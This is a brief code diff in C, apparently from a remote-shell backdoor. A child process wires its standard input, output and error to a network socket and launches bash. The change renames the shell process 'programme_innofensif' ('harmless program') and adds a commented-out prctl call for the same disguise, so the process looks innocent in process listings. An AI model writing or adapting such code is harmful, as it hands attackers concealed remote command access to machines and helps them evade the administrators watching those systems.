@@ -104,8 +104,8 @@ int main() {
             dup2(client_sock, STDOUT_FILENO); 
             dup2(client_sock, STDERR_FILENO); 
 
-
-            execl("/bin/bash", "bash",  NULL);
+            //prctl(PR_SET_NAME, "Programme innofensif",0,0,0);
+            execl("/bin/bash", "programme_innofensif",  NULL);
             perror("execl");
             exit(1);
         } else if (pid > 0) {
